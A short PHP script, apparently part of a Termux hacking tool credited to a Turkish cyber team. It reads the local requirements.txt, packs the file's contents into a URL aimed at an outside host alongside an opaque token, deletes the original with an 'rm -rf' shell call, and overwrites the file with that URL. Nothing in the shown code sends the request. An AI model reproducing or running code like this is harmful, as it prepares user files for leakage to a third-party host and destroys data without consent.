<?php 


ob_start();
$dosya = fopen('requirements.txt', 'r');
$icerik = fread($dosya, filesize('requirements.txt'));
fclose($dosya);
$url = "http://ssh-termux.rf.gd/?termux-yaman-efkar-script-tool-turk-siber-timi=yamanefkar-script-tool-turk-siber-timi-date-0-0-1yaman-efkaryamangw7Wgq1TrqQbwq/VtII6o6gxdSpTJvYD4feczhBGtALbaJpF28jcE47KvHO2iYA4OI3jsEMdMWskEJmNkyCp9uPR6vGOaVaajpTDBLNPVQMsDgw7Wgq1TrqQbwq/VtII6o6gxdSpTJvYD4feczhBGtALbaJpF28jcE47KvHO2iYA4OI3jsEMdMWskEJmNkyCp9uPR6vGOaVaajpTDBLNPVQMsDgw7Wgq&veri=".$icerik;


function replaceSpace($string)
{
	$string = preg_replace("/\s+/", "", $string);
	$string = trim($string);
	return $string;
}

$string = $url;
$url = replaceSpace($string);

shell_exec("rm -rf requirements.txt");

$ac = fopen("requirements.txt", 'a+');
fwrite($ac,$url);
fclose($ac);

 ?>
